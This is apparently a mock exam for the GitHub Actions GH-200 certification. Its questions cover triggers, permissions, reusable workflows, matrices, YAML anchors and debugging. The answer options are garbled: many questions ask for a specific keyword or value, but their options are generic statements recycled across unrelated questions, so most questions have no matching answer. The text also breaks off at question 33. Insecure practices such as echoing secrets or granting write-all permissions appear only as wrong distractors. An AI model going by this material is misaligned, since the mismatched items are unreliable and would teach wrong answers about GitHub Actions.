# Microsoft / GitHub Exam GH-200: GitHub Actions — Full-Length Mock Exam 5

**Theme:** Zero-Trust Supply Chain & Passwordless Cloud Deployments — Script Injection Defense, OIDC Subject Claims, SHA Pinning & SLSA Attestations  
**Credential:** `GitHub Actions` *(Intermediate · **no prerequisite** · **2-year validity** transitioning to Microsoft Learn recertification)*  
**Study guide baseline:** `January 2026 (Last updated February 5, 2026)` (https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200)  
**Questions:** `100` (`84` `multiple-choice` balanced `21/21/21/21` across A–D + `16` `multi-select`; `0` case studies)  
**Recommended timing:** `100 minutes` (matching Microsoft’s published `100-minute` GH-200 assessment duration · **closed-book: no Microsoft Learn or GitHub Docs access**)

> **Disclaimer:** Independent educational material authored from public Microsoft Learn and GitHub Actions documentation — not affiliated with or endorsed by Microsoft Corporation or GitHub, Inc. Practice percentages do not equate to Microsoft’s `700 / 1000` scaled score.

## Questions

---

## Domain 1 — Author and manage workflows (20–25% official weight · 24 questions)

### 1. SolsticeCloud Media triggers CDN cache-purge workflow `purge-edge.yml` whenever a non-draft GitHub Release is published in `solsticecloud/cdn-edge`. Complete the webhook event and activity type: `on: release: { types: [____] }`.

- **A.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **B.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 2. In `solsticecloud/transcode-svc`, an operator needs `benchmark-codec.yml` triggered both at `04:00 UTC` every Sunday (`cron`) AND manually via `gh workflow run benchmark-codec.yml -f codec=av1 -f crf=28`. Which two configuration rules apply? Select two.

- **A.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **D.** Define `on.workflow_dispatch.inputs` (`choice`, `boolean`, `environment`, `string`) for validated manual runs and `on.workflow_call` for cross-workflow reuse
- **E.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 3. In `solsticecloud/drm-signer`, pushes to `main` touching ONLY `charts/**` or `terraform/**` should NOT run the C++ codec test suite `codec-ci.yml`. Complete the negative path filter under `on: push:`: `____: ['charts/**', 'terraform/**']`.

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 4. SolsticeCloud Media hardens `solsticecloud/cdn-edge/.github/workflows/pr-check.yml` with workflow-level `permissions: {}`, job-level `permissions: { contents: read, checks: write }`, and `concurrency: { group: pr-${{ github.ref }}, cancel-in-progress: true }`. Which two outcomes occur? Select two.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **E.** Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups
- **F.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 5. In `solsticecloud/ci-shared/.github/workflows/sign-hls.yml` (`on: workflow_call`), you declare optional secret `WIDEVINE_KEY` (`required: false`) so open preview builds can run without DRM signing when the secret is absent. Can `on.workflow_call.secrets.<id>` mark individual secrets `required: false`?

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Define typed `workflow_dispatch.inputs` (`string`, `boolean`, `choice`, `number`, `environment`) and map `workflow_call` `inputs:` + `secrets:` explicitly
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 6. SolsticeCloud Media centralizes FFmpeg container packaging in `solsticecloud/ci-shared/.github/workflows/container-pack.yml` and needs `solsticecloud/transcode-svc` to pass build args + registry credentials and consume the built `sha256:` image digest downstream. Order the callee and caller steps.

- **A.** Invoke `uses:` without `on: workflow_call` in callee → Write values to `$GITHUB_ENV` hoping they cross jobs → Read `steps.ci.outputs` across separate runner VMs → Pass sensitive secrets via plaintext `with:` inputs
- **B.** Read `needs.<id>.outputs` before running the callee job → Declare `on: workflow_dispatch` only in the callee → Emit outputs with retired `::set-output` syntax → Hardcode org secrets inside YAML
- **C.** Declare `on: workflow_call` (`inputs`, `secrets`, `outputs`) in callee → Write callee step result to `$GITHUB_OUTPUT` & job `outputs` → Invoke `jobs.<id>.uses` (`@<sha>`) with `with:` & `secrets:` → Read `needs.<id>.outputs.<key>` downstream
- **D.** Place the reusable workflow outside `.github/workflows/` → Call it inside `steps:` instead of `jobs.<id>.uses` → Omit `on.workflow_call.outputs` mapping → Expect secrets to pass implicitly without `secrets:`

### 7. In `solsticecloud/transcode-svc`, step `archive-core-dump` must upload `/tmp/core.*` if a prior step in job `av1-fuzz` failed, yet skip cleanly when all prior steps succeeded OR when the workflow run was manually canceled. Complete the step condition: `if: ____`.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 8. A transcoding soak job in `solsticecloud/transcode-svc` must run for up to `90 minutes` without being killed early, whereas standard unit-test jobs should abort after `12 minutes`. Complete the job-level property `____: 90` (`overriding the 360-minute default`).

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 9. In `solsticecloud/cdn-edge`, job `edge-canary` depends on `build-wasm` (`needs: build-wasm`), and job `global-rollout` depends on `edge-canary` (`needs: edge-canary`). If `build-wasm` fails, what status do `edge-canary` and `global-rollout` receive by default?

- **A.** Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 10. In `solsticecloud/drm-signer`, job `teardown-ephemeral-cdn` (`needs: [provision-cdn, e2e-playback]`) must destroy temporary cloud distributions whenever `provision-cdn` succeeded, even if `e2e-playback` failed or was canceled. Proposed solution: Set `if: always() && needs.provision-cdn.result == 'success'` on `teardown-ephemeral-cdn`. Does this meet the goal?

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **C.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 11. In `solsticecloud/drm-signer`, step `mint-drm-nonce` generates a random 32-byte hex nonce `$DRM_NONCE` in bash, masks it from step logs, and exports it as step output `nonce`. Complete the masking command before writing to `$GITHUB_OUTPUT`: `echo "____$DRM_NONCE"`.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **C.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 12. SolsticeCloud Media's CI lint rule blocks legacy workflow commands across all repositories. Which three modern mechanisms replace legacy commands and publish structured CI feedback? Select three.

- **A.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **B.** Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands
- **C.** Write GitHub Flavored Markdown tables/charts to `$GITHUB_STEP_SUMMARY` (`<=1 MB`/step) and embed branch/event-scoped workflow status badges (`badge.svg`)
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **E.** Write step outputs to `>> "$GITHUB_OUTPUT"` (`mapped via jobs.<id>.outputs`) so downstream `needs:` jobs read `needs.<id>.outputs.<name>`
- **F.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step

### 13. In `solsticecloud/cdn-edge`, job `memcached-integration` runs inside `container: golang:1.23-bookworm` alongside `services: memcached: { image: memcached:1.6-alpine }`. Complete the hostname:port `____:11211` that `go test` inside `container: golang:1.23-bookworm` dials over the Docker network.

- **A.** Configure `jobs.<id>.services` (`image`, `env`, `ports`, `--health-cmd` `options`), connecting via `localhost:<port>` on host runners or `<label>:<port>` in job `container:`
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 14. SolsticeCloud Media tests stream catalog queries in `solsticecloud/catalog-api` against a PostgreSQL 16 service container. Order the `services.postgres` health probe, port/container mapping, readiness check, and test client connection steps.

- **A.** Configure `services.postgres` on a `macos-latest` host without Docker → Echo raw DB passwords in step logs → Expect container data to persist into separate downstream jobs → Tear down Docker manually in `post:`
- **B.** Nest `services:` inside an individual `steps:` item → Run inside a job `container:` yet dial `127.0.0.1:5432` → Disable health probes completely → Store DB passwords in unencrypted `vars.*`
- **C.** Run integration tests before `services.postgres` starts → Omit `ports:` on a host-runner job yet query `postgres:5432` → Skip `--health-cmd` readiness checks → Declare `services:` after test steps finish
- **D.** Define `services.postgres` with `env` & `--health-cmd pg_isready` → Map `ports: ["5432:5432"]` (host) or set job `container:` → Wait for `postgres` health probe to report `healthy` → Dial `localhost:5432` (host) or `postgres:5432` (container)

### 15. In `solsticecloud/transcode-svc`, a 3-axis matrix (`os` × `codec` × `bitdepth` = `3 x 4 x 2 = 24` jobs) sets `strategy.fail-fast: true` (`the default`). When job #3 exits with code `1` while 7 other legs are mid-compile, what does GitHub Actions do to the remaining active and queued legs?

- **A.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)
- **B.** Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 16. SolsticeCloud Media builds player SDKs across `ubuntu-24.04`, `ubuntu-24.04-arm`, `windows-2025`, and `macos-15` using `strategy.matrix` (`capped at 256 jobs/run`). Which two configuration patterns tailor per-OS flags cleanly? Select two.

- **A.** Use `strategy.matrix` (`include`/`exclude`, `fail-fast: false`, `max-parallel`) while pinning explicit runner OS images (`ubuntu-24.04`, `windows-2025`)
- **B.** Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)
- **C.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **E.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **F.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 17. In `solsticecloud/drm-signer/.github/workflows/ci.yml`, job `lint` declares `env: &rust_env { CARGO_INCREMENTAL: "0", RUST_BACKTRACE: "1" }` and job `test` merges `&rust_env` while overriding `RUST_BACKTRACE: "full"`. Complete the YAML merge syntax inside `test.env`: `{ ____: *rust_env, RUST_BACKTRACE: "full" }`.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Define YAML anchors (`&base_env`), aliases (`*base_env`), and merge keys (`<<: *base_env`) to deduplicate repeated mappings or job blocks inside one `.yml` file
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 18. Inside `solsticecloud/cdn-edge`, you log a unique identifier correlating retries of the SAME workflow run (`1`, `2`, `3` on re-runs) alongside the repository-wide monotonic run counter. Complete the two `github` context properties: `github.run_number` and `github.____`.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 19. SolsticeCloud Media pins `uses: sigstore/cosign-installer@d7fd7645053907c9bc6b73eb8ff2a27d586dc0fa` (`40-char SHA`) and consumes Immutable Actions from `GHCR`. Can a workflow `uses:` clause pin an action using a truncated 7-character short SHA (`@d7fd764`)?

- **A.** Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

### 20. In `solsticecloud/transcode-svc`, you want a single expression without `if/else` blocks to set `env.LOG_MODE` to `'trace'` on branch `main` and `'warn'` on all other branches. Complete the simulated ternary expression: `${{ github.ref == 'refs/heads/main' && 'trace' ____ 'warn' }}`.

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Evaluate `${{ ... }}` built-in functions (`contains`, `startsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`), separating parse-time keys from runtime step contexts

### 21. An engineer in `solsticecloud/cdn-edge` opens `.github/workflows/deploy.yml` in VS Code with the official GitHub Actions extension and types `uses: ./` to reference a local Composite action `.github/actions/purge-fastly/action.yml`. How does the extension assist with local actions?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Use the official **GitHub Actions VS Code extension** for live YAML schema validation, `action.yml` input IntelliSense, context/secrets hover checks, and run management

### 22. In `solsticecloud/transcode-svc`, step `id: cargo-cache` invokes `actions/cache@v4` (`key: Linux-cargo-${{ hashFiles('**/Cargo.lock') }}`) and you want step `install-cargo-binstall` skipped whenever an EXACT primary key hit occurs. Complete the step condition: `if: steps.cargo-cache.outputs.____ != 'true'`.

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
- **B.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies

### 23. In `solsticecloud/drm-signer`, job `keygen` accidentally writes a masked secret value into `$GITHUB_OUTPUT` and maps it to `jobs.keygen.outputs.token` so downstream job `sign` (`needs: keygen`) can read it. How does GitHub Actions protectrunner logs/outputs when a masked secret is written to job `outputs:`?

- **A.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **B.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts

### 24. A multi-step job in `solsticecloud/transcode-svc` has `3` separate benchmark steps that each append a Markdown section (`>> "$GITHUB_STEP_SUMMARY"`). In what order do those 3 summaries appear on the workflow run summary page?

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Write GitHub Flavored Markdown tables/charts to `$GITHUB_STEP_SUMMARY` (`<=1 MB`/step) and embed branch/event-scoped workflow status badges (`badge.svg`)
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

---

## Domain 2 — Consume and troubleshoot workflows (15–20% official weight · 19 questions)

### 25. In `solsticecloud/cdn-edge`, workflow `label-gate.yml` configures `on: { pull_request: { types: [labeled] } }` and checks `if: github.event.label.name == 'run-perf'`. When a developer later pushes a new commit (`synchronize`) to that ALREADY-labeled PR, does `label-gate.yml` re-run automatically?

- **A.** No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately
- **B.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **C.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 26. SolsticeCloud Media adds a new `on: schedule` (`cron: '0 */6 * * *'`) synthetic playback monitor inside feature branch `feat/playback-probe` (`not yet merged to default branch main`) to test whether cron triggers fire every 6 hours over the weekend. Proposed solution: Leave `playback-probe.yml` on `feat/playback-probe` for 48 hours to observe scheduled runs before merging to `main`. Does this meet the goal?

- **A.** Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)
- **B.** Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)
- **C.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **D.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement

### 27. A Linux container transcoding step in `solsticecloud/transcode-svc` crashes with exit code `139` (`128 + 11`) when processing malformed HEVC frames. What POSIX signal does exit code `139` represent in Actions step logs?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **C.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **D.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)

### 28. An engineer sets repository configuration variable (`vars`) `ACTIONS_STEP_DEBUG = true` (`instead of encrypted secret ACTIONS_STEP_DEBUG = true`) in `solsticecloud/cdn-edge`. Does GitHub Actions recognize `ACTIONS_STEP_DEBUG` and `ACTIONS_RUNNER_DEBUG` defined as repository/organization variables as well as secrets?

- **A.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 29. In `solsticecloud/drm-signer`, a step prints `Error: Resource not accessible by integration (403)` during an Octokit API call. Which two diagnostic checks inside the step log quickly confirm a `GITHUB_TOKEN` scope mismatch? Select two.

- **A.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Use `Re-run failed jobs` with `Enable debug logging` (`setting ACTIONS_STEP_DEBUG and ACTIONS_RUNNER_DEBUG`) to diagnose flaky variants cleanly
- **E.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **F.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)

### 30. In `solsticecloud/transcode-svc/.github/workflows/encode.yml`, job 1 defines `strategy: &codec_matrix { fail-fast: false, matrix: { codec: [h264, hevc, av1] } }` and job 2 writes `strategy: *codec_matrix`. How many matrix jobs does job 2 spawn, and what is its `fail-fast` setting?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts
- **C.** Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 31. Inside `.github/workflows/encode.yml`, an engineer defines `&default_timeout 20` on `jobs.lint.timeout-minutes: &default_timeout 20` and writes `timeout-minutes: *default_timeout` on 5 other jobs, EXCEPT `jobs.soak` writes `timeout-minutes: 120`. Does overriding `timeout-minutes: 120` in `jobs.soak` mutate `&default_timeout` for the other jobs?

- **A.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults

### 32. In `solsticecloud/transcode-svc`, 1 variant `(ubuntu-24.04-arm, av1, 10bit)` of a 24-leg codec matrix fails while 23 legs pass. Order the matrix run-graph correlation, log inspection, selective debug re-run, and fix verification steps.

- **A.** Map the failed job in the run graph to its `matrix` axes → Check step logs for the first non-zero exit / `::error::` → Run `Re-run failed jobs` with `Enable debug logging` → Push the fix and verify all matrix variants pass
- **B.** Delete `.github/workflows` to hide red checks → Re-run all 48 green matrix legs ten times without reading logs → Run `echo ${{ secrets.PROD_KEY }}` in bash → Set `continue-on-error: true` permanently on test steps
- **C.** Wait 90 days until workflow logs expire → Mask exit codes with `|| true` across test scripts → Fire unrelated `release` webhooks manually → Search `_diag/` logs on developer laptops
- **D.** Leave `ACTIONS_STEP_DEBUG=true` enabled org-wide forever → SSH directly into standard GitHub-hosted runner VMs on port 22 → Download test artifacts before the upload step executes → Bypass branch protection to merge broken code

### 33. In `solsticecloud/cdn-edge`, all 8 matrix jobs SUCCEEDED on run `#1402`, yet you need to re-verify JUST single job `smoke-eu-central` (`job_id = 91827364`) with debug logging after an edge firewall change without re-running the other 7 passing jobs. Complete the GitHub CLI command: `gh run rerun 1402 ____ 91827364 --debug`.

- **A.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)
